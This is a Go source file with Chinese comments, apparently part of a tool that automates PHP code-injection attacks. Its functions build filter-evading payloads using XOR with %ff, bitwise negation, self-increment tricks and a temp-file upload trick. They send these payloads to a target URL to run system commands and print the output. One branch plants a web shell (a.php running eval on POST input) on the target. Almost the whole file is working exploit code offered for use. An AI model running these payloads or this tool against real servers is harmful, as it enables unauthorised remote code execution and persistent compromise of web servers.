package script

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"net/url"
	"strings"

	"golang.org/x/text/encoding/charmap"
)

func Qufan(c string) string {
	// 在 Latin-1 编码下将字符串转换为字节流
	encoder := charmap.ISO8859_1.NewEncoder()
	latinBytes, err := encoder.Bytes([]byte(c))
	if err != nil {
		fmt.Println("编码失败:", err)
		return ""
	}

	// 计算取反后的字节流
	invertedBytes := make([]byte, len(latinBytes))
	for i, b := range latinBytes {
		invertedBytes[i] = ^b
	}

	// 将取反后的字节流转换为 Latin-1 编码下的字符串
	invertedString := string(invertedBytes)

	return invertedString
}

func Zizeng(URL string, command string, i string) {
	var c1 string
	var c2 string
	leftIndex := strings.Index(command, "(")
	if leftIndex == -1 {
		// 字符串中没有左括号
		c1 = command
		c2 = ""
		fmt.Println(WARNING + "字符串中没有左括号")
	}

	// 查找第一个右括号的索引
	rightIndex := strings.Index(command, ")")
	if rightIndex == -1 {
		// 字符串中没有右括号
		c1 = ""
		c2 = ""
		fmt.Println(WARNING + "字符串中没有右括号")
	}

	if leftIndex < rightIndex {
		// 括号正确匹配，提取括号内外的内容
		//c1是括号外内容，c2是括号内内容
		c1 = command[:leftIndex]
		c2 = command[leftIndex+1 : rightIndex]

	} else {
		// 括号不正确匹配
		c1 = command
		c2 = ""
		fmt.Println(WARNING + "括号不正确匹配")
	}
	payload := []byte(i + "=" + "$_=(%ff/%ff.%ff)[_];$%ff=%2b%2b$_;$$%ff[$%ff=_.%2b%2b$_.$%ff[$_%2b%2b/$_%2b%2b].%2b%2b$_.%2b%2b$_]($$%ff[_]);&_POST=" + c1 + "&_=" + c2)

	// 发起 POST 请求
	resp, err := http.Post(URL, "application/x-www-form-urlencoded", bytes.NewBuffer(payload))
	if err != nil {
		fmt.Println("发送 POST 请求失败:", err)
		return
	}
	defer resp.Body.Close()

	// 读取响应
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("读取响应失败:", err)
		return
	}

	// 输出响应
	fmt.Printf(inf+"POC为: %s\n", payload)
	fmt.Printf(inf+"回显为: %s\n", RemoveHTMLTags(string(respBody)))

}

func Ff(URL string, command string, guolv string, i string) {
	var xorresult string
	var result2 string
	var ffCount string

	//下面是对comman命令切片然后有括号的话提取括号内内容
	var c1 string
	var c2 string
	leftIndex := strings.Index(command, "(")
	if leftIndex == -1 {
		// 字符串中没有左括号
		c1 = command
		c2 = ""
	}

	// 查找第一个右括号的索引
	rightIndex := strings.Index(command, ")")
	if rightIndex == -1 {
		// 字符串中没有右括号
		c1 = ""
		c2 = ""
	}

	if leftIndex < rightIndex {
		// 括号正确匹配，提取括号内外的内容
		//c1是括号外内容，c2是括号内内容
		c1 = command[:leftIndex]
		c2 = command[leftIndex+1 : rightIndex]

	} else {
		// 括号不正确匹配
		c1 = command
		c2 = ""
	}
	var ff string
	var reURL string

	//遍历异或
	for _, char := range c2 {
		ffCount = strings.Repeat("%ff", len(c2)) //数数有几个字符需要与%ff进行异或

		for a := 0; a <= 15; a++ {
			hexa := fmt.Sprintf("%X", a)
			for b := 0; b <= 15; b++ {
				hexb := fmt.Sprintf("%X", b)
				result := "%" + hexa + hexb
				decoded, err := url.QueryUnescape(result)
				if err != nil {
					fmt.Printf("解码错误: %v\n", err)
					return
				}
				ff, err := url.QueryUnescape("%ff")
				if err != nil {
					fmt.Printf("解码错误: %v\n", err)
					return
				}

				xorresult = ""
				for i := 0; i < len(decoded); i++ {
					xorresult += string(decoded[i] ^ ff[i%len(ff)])
				}
				if xorresult == string(char) {
					result2 += result
				}
			}
		}
	}

	ff = ffCount + "^" + result2
	//ff是对c2进行异或得到的（c2是例如system（ipconfig）中的ipconfig）

	ff2 := "${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}('" + ff + "');"

	//输出异或结果（POC）

	fmt.Printf(inf+"POC为: %s\n", ff2)

	//判断不同过滤打不一样的POC

	if !strings.Contains(guolv, "^") && !strings.Contains(guolv, ";") {

		reURL = URL + "?" + i + "=" + ff2 + "&%ff=" + c1

	} else if !strings.Contains(guolv, "~") && strings.Contains(guolv, ";") {

		reURL = URL + "?" + i + "=" + "?><?=`{${~%A0%B8%BA%AB}{%ff}}`?>&%ff=" + c2

	} else if !strings.Contains(guolv, "~") && !strings.Contains(guolv, ";") {

		reURL = URL + "?" + i + "=" + "${~%A0%B8%BA%AB}{%ff}(~" + Qufan(c2) + ");&%ff=" + c1

	} else if !strings.Contains(guolv, "^") && strings.Contains(guolv, ";") {

		reURL = URL + "?" + i + "=" + "?><?=`" + ff + "`?>"

	}

	fmt.Printf(inf+"请求URl为: %s\n", reURL)

	res, err := http.Get(reURL)
	if err != nil {
		log.Fatal(err)
	}
	defer res.Body.Close()

	body, err := io.ReadAll(res.Body)

	REres := RemoveHTMLTags(string(body))
	fmt.Printf(inf+"回显为: %s \n", REres)
}

func Xor(URL string, command string, v int, i string) {
	var newURL string
	var payload string
	if v == 5 {
		newURL = URL + "?" + i + "=" + "$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);"
		fmt.Printf(inf+"POC为: %s\n", newURL)
		fmt.Printf("\033[33m" + "[Tips] " + "\033[39m" + "请注意,这里的command应该是如phpinfo();这样格式的\n")
		payload = "_=" + command
	} else if v == 7 {
		newURL = URL + "?" + i + "=" + "$_=('%06'^'`').('%09'^'`').('%0c'^'`').('%05'^'`').'_'.('%10'^'`').('%15'^'`').('%14'^'`').'_'.('%03'^'`').('%0f'^'`').('%0e'^'`').('%14'^'`').('%05'^'`').('%0e'^'`').('%14'^'`').('%13'^'`');$__=('%01'^'`').'.'.('%10'^'`').('%08'^'`').('%10'^'`');$___='<?'.('%10'^'`').('%08'^'`').('%10'^'`').' '.('%05'^'`').('%16'^'`').('%01'^'`').('%0c'^'`').'($_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']').'[_]);?>';$____=$_($__,$___);"
		fmt.Printf(inf+"POC为: %s\n", newURL)
		fmt.Printf("\033[33m" + " [Tips] " + "\033[39m" + "请注意,这里的command应该是如phpinfo();这样格式的\n")
		http.Get(newURL)
		newURL = URL + "/../a.php" //生成并访问a.php,a.php代码为<?php eval($_POST[_]);?>
		payload = "_=" + command
	}

	client := &http.Client{}

	// 创建一个 POST 请求
	request, err := http.NewRequest("POST", newURL, strings.NewReader(payload))
	if err != nil {
		fmt.Println("创建请求时发生错误:", err)
		return
	}

	// 设置 Content-Type 头部
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// 发送请求
	response, err := client.Do(request)
	if err != nil {
		fmt.Println(WARNING+"发送请求时发生错误:", err)
		return
	}
	defer response.Body.Close()

	// 读取响应数据
	body, err := io.ReadAll(response.Body)
	if err != nil {
		fmt.Println(WARNING+"读取响应时发生错误:", err)
		return
	}

	// 打印响应结果
	fmt.Println(inf+"回显为:", RemoveHTMLTags(string(body)))
}

func Noshuzievaljinjie(url string, command string, v int, i string, m string, guolv string) {
	var c1 string
	var c2 string
	leftIndex := strings.Index(command, "(")
	if leftIndex == -1 {
		// 字符串中没有左括号
		c1 = command
		c2 = ""
	}

	// 查找第一个右括号的索引
	rightIndex := strings.Index(command, ")")
	if rightIndex == -1 {
		// 字符串中没有右括号
		c1 = ""
		c2 = ""
	}
	var c3 string
	if leftIndex < rightIndex {
		// 括号正确匹配，提取括号内外的内容
		c1 = command[:leftIndex]
		c2 = command[leftIndex+1 : rightIndex]

		c2 = Qufan(c2) //对括号内系统命令取反

		c3 = "~" + c2

	} else {
		// 括号不正确匹配
		c1 = command
		c2 = ""
	}

	var rec string

	if v == 7 {
		fmt.Println(inf + "PHP版本为7.x")
		fmt.Printf(inf + "可以使用取反来解决")
		POC := Qufan(c1)
		if !strings.Contains(guolv, "(") && !strings.Contains(guolv, ")") && !strings.Contains(guolv, "~") && !strings.Contains(guolv, ";") {
			command = "(~" + POC + ")(" + c3 + ");"
			fmt.Printf(inf+"POC为: %s\n", command)

		} else if !strings.Contains(guolv, "(") && !strings.Contains(guolv, ")") && !strings.Contains(guolv, "~") && !strings.Contains(guolv, "<") && !strings.Contains(guolv, "=") && !strings.Contains(guolv, ">") && !strings.Contains(guolv, "?") && !strings.Contains(guolv, "`") {
			fmt.Printf("\033[33m" + "[Tips] " + "\033[39m" + "这里只能执行system命令")
			command = "?><?=`(" + c3 + ")`?>"
			fmt.Printf(inf+"POC为: %s\n", command)
		}

	} else if v == 5 {
		fmt.Println(inf + "PHP版本为5.x")
		rec = "?><?=`. /???/????????[?-[]`;?>"
		m = "POST"
	}

	if m == "GET" {

		res, err := http.Get(url + "?" + i + "=" + command)
		if err != nil {
			log.Fatal(err)
		}
		defer res.Body.Close()

		body, err := io.ReadAll(res.Body)

		REres := RemoveHTMLTags(string(body))
		fmt.Printf(inf+"回显为: %s \n", REres) //如果是GET方式就直接GET

	} else if m == "POST" {
		reurl := url + "?" + i + "=" + rec
		fileContent := []byte("#!/bin/sh\n\n" + command)

		body := &bytes.Buffer{}
		writer := multipart.NewWriter(body)

		// 创建一个文件字段，并将文件数据写入其中
		fileField, err := writer.CreateFormFile("file", "1.txt")
		if err != nil {
			fmt.Println("创建表单文件字段失败:", err)
			return
		}
		_, err = fileField.Write(fileContent)
		if err != nil {
			fmt.Println("写入文件数据失败:", err)
			return
		}

		// 完成表单数据的写入
		err = writer.Close()
		if err != nil {
			fmt.Println("关闭表单写入器失败:", err)
			return
		}
		req, err := http.NewRequest("POST", reurl, body)
		if err != nil {
			fmt.Println("创建 POST 请求失败:", err)
			return
		}
		req.Header.Set("Content-Type", writer.FormDataContentType())

		// 发送请求
		client := http.DefaultClient
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("发送 POST 请求失败:", err)
			return
		}
		defer resp.Body.Close()

		// 读取响应
		respBody, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("读取响应失败:", err)
			return
		}

		// 输出响应
		fmt.Println()
		fmt.Printf(inf+"回显为: %s\n", RemoveHTMLTags(string(respBody)))

	}

}
